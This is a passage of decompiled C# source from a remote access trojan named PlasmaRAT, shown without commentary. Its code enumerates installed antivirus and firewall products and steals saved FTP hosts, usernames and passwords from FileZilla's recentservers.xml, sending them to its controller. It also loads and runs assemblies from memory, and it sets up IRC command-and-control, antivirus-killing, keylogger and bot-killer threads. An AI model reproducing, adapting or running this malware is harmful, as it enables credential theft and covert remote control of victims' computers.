				if (Operators.CompareString(text, string.Empty, false) == 0)
				{
					text = "N/A";
				}
				text = "AntiVirus: " + text.ToString();
				result = text;
			}
			catch (Exception ex)
			{
				result = "AntiVirus: N/A";
			}
			return result;
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00008110 File Offset: 0x00006310
		public static void ftpsteal()
		{
			try
			{
				StreamReader streamReader = new StreamReader(Interaction.Environ("AppData") + "\\FileZilla\\recentservers.xml");
				string source = streamReader.ReadToEnd();
				streamReader.Close();
				Conversions.ToString(PlasmaRAT.ftpstealer("<Host>(.+?)</Host>\\s+.+\\s+.+\\s+.+\\s+<User>(.+?)</User>\\s+<Pass>(.+?)</Pass>", source));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00008174 File Offset: 0x00006374
		public static void ReflectBytes(byte[] data)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(PlasmaRAT.Run));
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(data);
		}

		// Token: 0x06000075 RID: 117 RVA: 0x000081A4 File Offset: 0x000063A4
		public static void Run(object o)
		{
			MethodInfo entryPoint = Assembly.Load((byte[])o).EntryPoint;
			entryPoint.Invoke(null, (entryPoint.GetParameters().Length == 1) ? new string[][]
			{
				new string[0]
			} : null);
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000081F0 File Offset: 0x000063F0
		public static object ftpstealer(string expression, string source)
		{
			object result;
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				Regex regex = new Regex(expression);
				MatchCollection matchCollection = regex.Matches(source);
				foreach (object obj in matchCollection)
				{
					Match match = (Match)obj;
					GroupCollection groups = match.Groups;
					Thread.Sleep(1000);
					PlasmaRAT.Send(string.Concat(new string[]
					{
						"PASS*",
						groups[1].Value,
						"*",
						groups[2].Value,
						"*",
						groups[3].Value,
						"*"
					}));
				}
				result = stringBuilder.ToString();
			}
			catch (Exception ex)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00008300 File Offset: 0x00006500
		public static string GetFirewall()
		{
			string result;
			try
			{
				string text = null;
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct");
				ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = managementObject["displayName"].ToString();
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				if (Operators.CompareString(text, string.Empty, false) == 0)
				{
					text = "N/A";
				}
				text = "Firewall: " + text.ToString();
				result = text;
			}
			catch (Exception ex)
			{
				result = "Firewall: N/A";
			}
			return result;
		}

		// Token: 0x06000078 RID: 120
		[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DeleteFile(string name);

		// Token: 0x04000050 RID: 80
		public static bool RunBotKiller = false;

		// Token: 0x04000051 RID: 81
		public static bool AutoBotKill = false;

		// Token: 0x04000052 RID: 82
		public static bool Muted = false;

		// Token: 0x04000053 RID: 83
		public static Mutex OneBotOnly = new Mutex();

		// Token: 0x04000054 RID: 84
		public static TcpClient IRC;

		// Token: 0x04000055 RID: 85
		public static StreamWriter Write;

		// Token: 0x04000056 RID: 86
		public static StreamReader Read;

		// Token: 0x04000058 RID: 88
		private static string s = Process.GetCurrentProcess().ToString();

		// Token: 0x04000059 RID: 89
		private static int i = PlasmaRAT.s.IndexOf("(");

		// Token: 0x0400005A RID: 90
		private static string f = PlasmaRAT.s.Substring(PlasmaRAT.i + 1, PlasmaRAT.s.IndexOf(")", PlasmaRAT.i + 1) - PlasmaRAT.i - 1);

		// Token: 0x0400005B RID: 91
		private static string RookitEnable;

		// Token: 0x0400005C RID: 92
		public static Thread Antis = new Thread(new ThreadStart(AntiEverything.RunAntis));

		// Token: 0x0400005D RID: 93
		public static Thread ProactiveAV = new Thread(new ThreadStart(AVKill.ProactiveAVKill));

		// Token: 0x0400005E RID: 94
		public static Thread IRCThread = new Thread(new ThreadStart(PlasmaRAT.connect));

		// Token: 0x0400005F RID: 95
		public static Thread AVKillThread = new Thread(new ThreadStart(AVKill.Start));

		// Token: 0x04000060 RID: 96
		public static Thread LoggerThread = new Thread(new ThreadStart(Logger.StartLogger));

		// Token: 0x04000061 RID: 97
		public static string InstallationOfEverything;

		// Token: 0x04000062 RID: 98
		public static bool keepalive = false;

		// Token: 0x04000063 RID: 99
		public static bool readlines = false;

		// Token: 0x04000064 RID: 100
		public static bool InstalledSuccessfully = false;

		// Token: 0x04000065 RID: 101
		public static string[] Settings;

		// Token: 0x04000066 RID: 102
		public static string Server = "DESTORID//WASTELAND//2.0";

		// Token: 0x04000067 RID: 103
		public static string BackupDNS;

		// Token: 0x04000068 RID: 104
		public static string BackupServer = string.Empty;

		// Token: 0x04000069 RID: 105
		public static int port;

		// Token: 0x0400006A RID: 106
		public static string Username = "\\\\\\\\\\\\\\\\\\\\\\\\\\\\";

		// Token: 0x0400006B RID: 107
		public static string Password = "IUWEEQWIOER$89^*(&@^$*&#@$HAFKJHDAKJSFHjd89379327AJHFD*&#($hajklshdf##*$&^(AAA";

		// Token: 0x0400006C RID: 108
		public static string RunFileAs = "EI#&*(R&USOKFDJLKDSJLFKJOWI";

		// Token: 0x0400006D RID: 109
		public static string InstallFolder = "xkjeio*(&#(*&$(*#@&$(*&#@(*&(!&(*#&kjhdfalkjsfdsaF";

		// Token: 0x0400006E RID: 110
		public static string WhatToRun = string.Empty;

		// Token: 0x02000052 RID: 82
		// (Invoke) Token: 0x0600018A RID: 394
		private delegate void MessageReceived(string msg);

		// Token: 0x02000053 RID: 83
		public class Getcn
		{
			// Token: 0x0600018C RID: 396
			[DllImport("kernel32.dll")]
			private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);

			// Token: 0x0600018D RID: 397 RVA: 0x0000F490 File Offset: 0x0000D690
			private static string GetInfo(uint lInfo)
			{
				string result;
				try
				{
					StringBuilder stringBuilder = new StringBuilder(256);
					int localeInfo = PlasmaRAT.Getcn.GetLocaleInfo(1024u, lInfo, stringBuilder, stringBuilder.Capacity);
					if (localeInfo > 0)
					{
						result = stringBuilder.ToString().Substring(0, localeInfo - 1);
					}
					else
					{
						result = "Error";
					}
				}
				catch (Exception ex)
				{
				}
				return result;
			}

			// Token: 0x0600018E RID: 398 RVA: 0x000029C4 File Offset: 0x00000BC4
			public static string g()
			{
				return PlasmaRAT.Getcn.GetInfo(7u);
			}

			// Token: 0x0400017A RID: 378
			private const uint LOCALE_SYSTEM_DEFAULT = 1024u;

			// Token: 0x0400017B RID: 379
			private const uint LOCALE_SABBREVCTRYNAME = 7u;
		}
	}
}
